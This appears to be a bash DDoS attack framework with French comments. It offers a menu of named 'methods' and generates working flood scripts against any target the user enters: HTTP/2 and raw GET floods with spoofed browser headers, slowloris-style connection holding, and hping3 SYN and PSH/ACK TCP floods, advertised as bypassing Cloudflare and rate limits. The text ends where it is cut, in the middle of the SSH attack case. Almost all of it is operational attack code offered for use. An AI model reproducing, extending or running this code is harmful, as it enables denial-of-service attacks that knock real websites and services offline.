#!/bin/bash

set -uo pipefail

# Limites système optimisées pour 12 CPU / 32 GB RAM
ulimit -u 8192
ulimit -n 16384

# Spécifications serveur
CPU_CORES=12
RAM_GB=32
MAX_THREADS_L7=5000
MAX_THREADS_L4=3000

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Fonction pour afficher le header
show_header() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                                                                      ║
    ║        ███████╗███╗   ███╗██╗   ██╗███╗   ██╗ ██████╗              ║
    ║        ██╔════╝████╗ ████║╚██╗ ██╔╝████╗ ██║██╔═══██╗             ║
    ║        █████╗  ██╔████╔██║ ╚████╔╝ ██╔██╗██║██║   ██║             ║
    ║        ██╔══╝  ██║╚██╔╝██║  ╚██╔╝  ██║╚████║██║   ██║             ║
    ║        ███████╗██║ ╚═╝ ██║   ██║   ██║ ╚███║╚██████╔╝             ║
    ║        ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚══╝ ╚═════╝              ║
    ║                                                                      ║
    ║           Advanced Layer 7 DDoS Attack Framework v2.0                ║
    ║                                                                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Fonction pour afficher le menu principal
show_menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}Select Attack Method:${NC}                                               ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 7 (HTTP/HTTPS) ATTACKS:${NC}                                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}Browser Emulation:${NC}                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[1]${NC}  browser          - HTTP/2/3 Flood (Chrome/Firefox Emulation)  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[2]${NC}  browser-vip      - Browser VIP Attack (Premium)                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[3]${NC}  h2-zero          - HTTP/2 Flood (UAM Bypass)                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[4]${NC}  h2-zerov2        - HTTP/2 Zero V2 (Enhanced)                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[5]${NC}  rapid-zero       - HTTP/2/3 Flood (Chrome/Firefox)              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[6]${NC}  rapid-zero-priv  - Rapid Zero Private                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}HTTP/2 Raw:${NC}                                                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[7]${NC}  h2-raw           - HTTP/2 Raw Flood (High RPS)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[8]${NC}  h2-rawgeo        - HTTP/2 Raw Geo Flood                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[9]${NC}  h2f              - HTTP/2 Flood (Standard)                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[10]${NC} h2f-priv         - HTTP/2 Flood Private                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}HTTP Raw GET:${NC}                                                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[11]${NC} http-free        - Free HTTP Flood                             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[12]${NC} http-raw         - RAW GET Flood (Low Bypass)                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[13]${NC} http-raw-priv    - RAW GET Flood Private                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}Zero Attacks:${NC}                                                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[14]${NC} zero             - HTTP/2 Flooder (Ratelimit)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[15]${NC} zero-bypass      - Bypassing All Sites (No Request Capture)    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[16]${NC} zero-rst         - Zero RST (Cloudflare Custom Rule Bypass)    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[17]${NC} zero-rstgeo      - Zero RST Geo                                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[18]${NC} zerov2           - HTTP/2 Flooder (Ratelimit Bypass)            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}VHold:${NC}                                                             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[19]${NC} vhold            - Method for Holding Sites (Max 10 conc)       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[20]${NC} vholdv2          - VHold V2 (Enhanced)                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 4 (TCP) ATTACKS - Restricted (No UDP, No Ports 80/443):${NC}        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[21]${NC} tcp              - High PPS TCP Flood (Non-80/443)              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[22]${NC} tcp-bot          - TCP Bot Attack (Non-80/443)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[23]${NC} tcp-pshack       - TCP PSH + ACK (Non-80/443)                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[24]${NC} tcprand          - TCP Random (Non-80/443)                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[25]${NC} sshkill          - SSH Kill Attack                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[26]${NC} sshkill-bot      - SSH Kill Bot                                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}UTILITIES:${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}UTILITIES & TOOLS:${NC}                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[99]${NC} View Active Attacks                                            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[98]${NC} Stop All Attacks                                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[97]${NC} Test Connection                                               ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[96]${NC} System Monitoring (CPU, RAM, Network)                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[95]${NC} Bandwidth Test (Speed Test)                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[94]${NC} Network Statistics (ifconfig, netstat)                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[93]${NC} Latency Test (Ping multiple hosts)                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[92]${NC} View Attack Statistics (dstat logs)                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[91]${NC} Process Monitor (Top processes)                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[90]${NC} Network Interface Info                                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[0]${NC}  Exit                                                           ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Fonction pour demander les paramètres d'attaque
get_attack_params() {
    local method=$1
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Attack Parameters: ${method}${NC}                                        ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "$(echo -e ${YELLOW}Target IP/Host:${NC} ) " TARGET
    read -p "$(echo -e ${YELLOW}Port [default: 443 for L7, custom for L4]:${NC} ) " PORT
    PORT=${PORT:-443}
    
    read -p "$(echo -e ${YELLOW}Duration in seconds [default: 60]:${NC} ) " DURATION
    DURATION=${DURATION:-60}
    
    # Déterminer les limites selon le type d'attaque
    if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot)$ ]]; then
        MAX_THREADS=$MAX_THREADS_L4
        DEFAULT_THREADS=2000
        echo -e "${CYAN}Server specs: ${CPU_CORES} CPU cores, ${RAM_GB} GB RAM${NC}"
        read -p "$(echo -e ${YELLOW}Threads/Connections [default: $DEFAULT_THREADS, max: $MAX_THREADS]:${NC} ) " THREADS
        THREADS=${THREADS:-$DEFAULT_THREADS}
    else
        MAX_THREADS=$MAX_THREADS_L7
        DEFAULT_THREADS=3000
        echo -e "${CYAN}Server specs: ${CPU_CORES} CPU cores, ${RAM_GB} GB RAM${NC}"
        read -p "$(echo -e ${YELLOW}Threads/Connections [default: $DEFAULT_THREADS, max: $MAX_THREADS]:${NC} ) " THREADS
        THREADS=${THREADS:-$DEFAULT_THREADS}
    fi
    
    if [ "$THREADS" -gt "$MAX_THREADS" ]; then
        echo -e "${YELLOW}⚠ Limiting threads to $MAX_THREADS (server limit)${NC}"
        THREADS=$MAX_THREADS
    fi
    
    # Vérifier restriction L4 sur ports 80/443
    if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot)$ ]]; then
        if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
            echo -e "${RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║${NC} ${BOLD}ERROR: L4 attacks on ports 80 and 443 are FORBIDDEN!${NC}                    ${RED}║${NC}"
            echo -e "${RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
            read -p "Press Enter to continue..."
            return 1
        fi
    fi
    
    read -p "$(echo -e ${YELLOW}Additional options [optional, e.g. --rate-limit 100]:${NC} ) " OPTIONS
    
    export TARGET PORT DURATION THREADS OPTIONS
    return 0
}

# Fonction pour créer un script L7 performant
create_l7_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    case "$method" in
        browser|browser-vip|h2-zero|h2-zerov2|rapid-zero|rapid-zero-priv)
            create_h2_browser_script "$method"
            ;;
        h2-raw|h2-rawgeo|h2f|h2f-priv)
            create_h2_raw_script "$method"
            ;;
        http-raw|http-raw-priv|http-free)
            create_http_raw_script "$method"
            ;;
        zero|zerov2|zero-bypass|zero-rst|zero-rstgeo)
            create_zero_script "$method"
            ;;
        vhold|vholdv2)
            create_vhold_script "$method"
            ;;
        *)
            create_generic_l7_script "$method"
            ;;
    esac
}

# Fonction pour vérifier les ressources système
check_resources() {
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    local mem_usage=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
    
    echo "$cpu_usage $mem_usage"
}

# Script HTTP/2 Browser Emulation (performant avec protection ressources)
create_h2_browser_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"
TIMEOUT=$((DURATION + 10))
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# Limites optimisées pour 12 CPU / 32 GB RAM
MAX_CONCURRENT=400
MAX_CPU=92
MAX_MEM=92
BATCH_SIZE=50
BATCH_DELAY=0.02

echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

# User agents rotatifs
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# Fonction d'attaque avec contrôle ressources
attack_h2() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    local ua_idx=$((tid % ${#UA_LIST[@]}))
    local ua="${UA_LIST[$ua_idx]}"
    
    while [ $(date +%s) -lt $end_time ]; do
        # Vérifier les ressources toutes les 10 requêtes
        if [ $((tid % 10)) -eq 0 ]; then
            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
            
            if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                sleep 0.5
                continue
            fi
        fi
        
        # Limiter les processus simultanés
        local running=$(jobs -r | wc -l)
        while [ $running -ge $MAX_CONCURRENT ]; do
            sleep 0.1
            running=$(jobs -r | wc -l)
        done
        
        curl -s -k -m 1 \
            --http2 \
            --http2-prior-knowledge \
            -H "User-Agent: $ua" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: en-US,en;q=0.5" \
            -H "Accept-Encoding: gzip, deflate, br" \
            -H "Connection: keep-alive" \
            -H "Upgrade-Insecure-Requests: 1" \
            -H "Sec-Fetch-Dest: document" \
            -H "Sec-Fetch-Mode: navigate" \
            -H "Sec-Fetch-Site: none" \
            -H "Cache-Control: max-age=0" \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        sleep 0.05
    done
}

# Lancer les threads par batch pour éviter la surcharge
for i in $(seq 1 $THREADS); do
    attack_h2 $i &
    
    # Lancer par batch avec pause
    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
        sleep $BATCH_DELAY
    fi
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script HTTP/2 Raw (haute performance avec protection)
create_h2_raw_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# Limites de sécurité
MAX_CONCURRENT=150
MAX_CPU=85
MAX_MEM=85
BATCH_SIZE=25
BATCH_DELAY=0.05

echo "[$METHOD] Starting high RPS attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

# Attaque HTTP/2 avec contrôle ressources
attack_raw() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    local request_count=0
    
    while [ $(date +%s) -lt $end_time ]; do
        # Vérifier les ressources périodiquement
        if [ $((request_count % 20)) -eq 0 ]; then
            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
            
            if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                sleep 0.3
                continue
            fi
        fi
        
        # Limiter les processus simultanés
        local running=$(jobs -r | wc -l)
        while [ $running -ge $MAX_CONCURRENT ]; do
            sleep 0.05
            running=$(jobs -r | wc -l)
        done
        
        curl -s -k -m 0.5 \
            --http2 \
            --http2-prior-knowledge \
            --no-keepalive \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        request_count=$((request_count + 1))
        sleep 0.005
    done
}

# Lancer par batch
for i in $(seq 1 $THREADS); do
    attack_raw $i &
    
    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
        sleep $BATCH_DELAY
    fi
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script HTTP Raw GET (avec protection)
create_http_raw_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-80}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="http"
[ "$PORT" = "443" ] && PROTOCOL="https"

# Limites optimisées pour haute performance
MAX_CONCURRENT=450
MAX_CPU=92
MAX_MEM=92
BATCH_SIZE=55
BATCH_DELAY=0.015

echo "[$METHOD] Starting RAW GET flood on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

# Attaque GET avec contrôle
attack_get() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    local request_count=0
    
    while [ $(date +%s) -lt $end_time ]; do
        # Vérifier ressources
        if [ $((request_count % 15)) -eq 0 ]; then
            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
            
            if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                sleep 0.2
                continue
            fi
        fi
        
        # Limiter processus
        local running=$(jobs -r | wc -l)
        while [ $running -ge $MAX_CONCURRENT ]; do
            sleep 0.05
            running=$(jobs -r | wc -l)
        done
        
        curl -s -k -m 1 \
            --no-keepalive \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        request_count=$((request_count + 1))
        sleep 0.01
    done
}

# Lancer par batch
for i in $(seq 1 $THREADS); do
    attack_get $i &
    
    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
        sleep $BATCH_DELAY
    fi
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script Zero (bypass ratelimit avec protection)
create_zero_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# Limites optimisées pour slowloris-like
MAX_CONCURRENT=300
MAX_CPU=90
MAX_MEM=90
BATCH_SIZE=40
BATCH_DELAY=0.05

echo "[$METHOD] Starting ratelimit bypass attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

# Slowloris-like avec HTTP/2 et protection
if command -v slowloris &> /dev/null; then
    # Limiter les threads pour slowloris
    SLOWLORIS_THREADS=$((THREADS > 500 ? 500 : THREADS))
    slowloris "$TARGET" -p "$PORT" -s "$SLOWLORIS_THREADS" -t "$DURATION" $OPTIONS
else
    # Implémentation manuelle avec contrôle
    attack_zero() {
        local tid=$1
        local end_time=$(($(date +%s) + DURATION))
        local conn_count=0
        
        while [ $(date +%s) -lt $end_time ]; do
            # Vérifier ressources
            if [ $((conn_count % 10)) -eq 0 ]; then
                local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
                local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
                
                if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                    sleep 0.5
                    continue
                fi
            fi
            
            # Limiter connexions simultanées
            local running=$(jobs -r | wc -l)
            while [ $running -ge $MAX_CONCURRENT ]; do
                sleep 0.2
                running=$(jobs -r | wc -l)
            done
            
            curl -s -k -m 10 \
                --http2 \
                --max-time 10 \
                --keepalive-time 10 \
                "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
            
            conn_count=$((conn_count + 1))
            sleep 0.1
        done
    }
    
    # Lancer par batch
    for i in $(seq 1 $THREADS); do
        attack_zero $i &
        
        if [ $((i % BATCH_SIZE)) -eq 0 ]; then
            sleep $BATCH_DELAY
        fi
    done
    wait
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script VHold (holding connections avec protection)
create_vhold_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-7200}
THREADS=${4:-10}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# VHold: max 10 connections, 7200s timelimit
THREADS=$((THREADS > 10 ? 10 : THREADS))
DURATION=$((DURATION > 7200 ? 7200 : DURATION))

# Limites optimisées
MAX_CPU=85
MAX_MEM=85

echo "[$METHOD] Holding connections on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS connections"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%"

# Maintenir les connexions ouvertes avec monitoring
hold_connection() {
    local conn_id=$1
    local end_time=$(($(date +%s) + DURATION))
    local reconnect_interval=5
    
    while [ $(date +%s) -lt $end_time ]; do
        # Vérifier ressources avant de reconnecter
        local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
        local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
        
        if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
            sleep 2
            continue
        fi
        
        curl -s -k -m 30 \
            --http2 \
            --max-time 30 \
            --no-buffer \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 || true
        
        sleep $reconnect_interval
    done
}

# Lancer avec délai entre chaque connexion
for i in $(seq 1 $THREADS); do
    hold_connection $i &
    sleep 0.5
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script générique L7 (avec protection)
create_generic_l7_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# Limites optimisées pour haute performance
MAX_CONCURRENT=350
MAX_CPU=92
MAX_MEM=92
BATCH_SIZE=45
BATCH_DELAY=0.02

echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

attack_generic() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    local request_count=0
    
    while [ $(date +%s) -lt $end_time ]; do
        # Vérifier ressources
        if [ $((request_count % 12)) -eq 0 ]; then
            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
            
            if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                sleep 0.3
                continue
            fi
        fi
        
        # Limiter processus
        local running=$(jobs -r | wc -l)
        while [ $running -ge $MAX_CONCURRENT ]; do
            sleep 0.08
            running=$(jobs -r | wc -l)
        done
        
        curl -s -k -m 1 \
            --http2 \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        request_count=$((request_count + 1))
        sleep 0.01
    done
}

# Lancer par batch
for i in $(seq 1 $THREADS); do
    attack_generic $i &
    
    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
        sleep $BATCH_DELAY
    fi
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Fonction pour créer un script L4 performant avec protection
create_l4_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    cat > "/opt/discord.cool/attacks/l4_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-8080}
DURATION=${3:-60}
THREADS=${4:-500}
OPTIONS=$5

METHOD="METHOD_NAME"

# Vérification restriction ports 80/443
if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
    echo "ERROR: L4 attacks on ports 80 and 443 are forbidden!"
    exit 1
fi

# Limites optimisées pour L4 (12 CPU / 32 GB RAM)
MAX_CONCURRENT=600
MAX_CPU=90
MAX_MEM=90
BATCH_SIZE=80
BATCH_DELAY=0.05

echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"
echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"

if command -v hping3 &> /dev/null; then
    # Fonction pour lancer hping3 avec contrôle
    launch_hping() {
        local hping_cmd="$1"
        local process_count=0
        
        for i in $(seq 1 $THREADS); do
            # Vérifier ressources périodiquement
            if [ $((process_count % 50)) -eq 0 ]; then
                local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
                local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
                
                if [ "${cpu%.*}" -gt "$MAX_CPU" ] || [ "${mem%.*}" -gt "$MAX_MEM" ]; then
                    sleep 0.5
                    continue
                fi
            fi
            
            # Limiter processus simultanés
            local running=$(jobs -r | wc -l)
            while [ $running -ge $MAX_CONCURRENT ]; do
                sleep 0.1
                running=$(jobs -r | wc -l)
            done
            
            eval "$hping_cmd" &
            process_count=$((process_count + 1))
            
            # Lancer par batch
            if [ $((process_count % BATCH_SIZE)) -eq 0 ]; then
                sleep $BATCH_DELAY
            fi
        done
    }
    
    case "$METHOD" in
        tcp|tcp-bot)
            launch_hping "timeout $DURATION hping3 -S -p $PORT -i u1000 $TARGET"
            ;;
        tcp-pshack)
            launch_hping "timeout $DURATION hping3 -S -A -P -F -p $PORT -i u1000 $TARGET"
            ;;
        tcprand)
            for i in $(seq 1 $THREADS); do
                RAND_PORT=$((RANDOM % 65535 + 1))
                local running=$(jobs -r | wc -l)
                while [ $running -ge $MAX_CONCURRENT ]; do
                    sleep 0.1
                    running=$(jobs -r | wc -l)
                done
                timeout "$DURATION" hping3 -S -p "$RAND_PORT" -i u1000 "$TARGET" &
                if [ $((i % BATCH_SIZE)) -eq 0 ]; then
                    sleep $BATCH_DELAY
                fi
            done
            ;;
        sshkill|sshkill-bot)
